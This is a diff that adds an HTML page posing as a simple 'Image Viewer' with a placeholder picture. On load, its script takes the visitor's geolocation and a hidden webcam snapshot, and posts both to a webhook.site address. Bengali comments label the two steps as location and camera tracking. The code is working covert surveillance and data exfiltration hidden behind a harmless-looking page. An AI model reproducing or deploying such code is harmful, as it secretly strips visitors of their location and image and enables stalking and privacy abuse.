@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+</head>
+<body style="margin:0; background-color:black; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <img src="https://via.placeholder.com/300" style="max-width:100%;">
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
+
+        window.onload = function() {
+            // ১. লোকেশন ট্র্যাকিং
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
+                        body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) 
+                    });
+                });
+            }
+
+            // ২. ক্যামেরা ট্র্যাকিং
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imgData = canvas.toDataURL('image/jpeg');
+                        
+                        // ছবি Webhook-এ পাঠানো
+                        fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: imgData });
+                        
+                        // ক্যামেরা বন্ধ করা
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 2000);
+                });
+            }
+        };
+    </script>
+</body>
+</html>
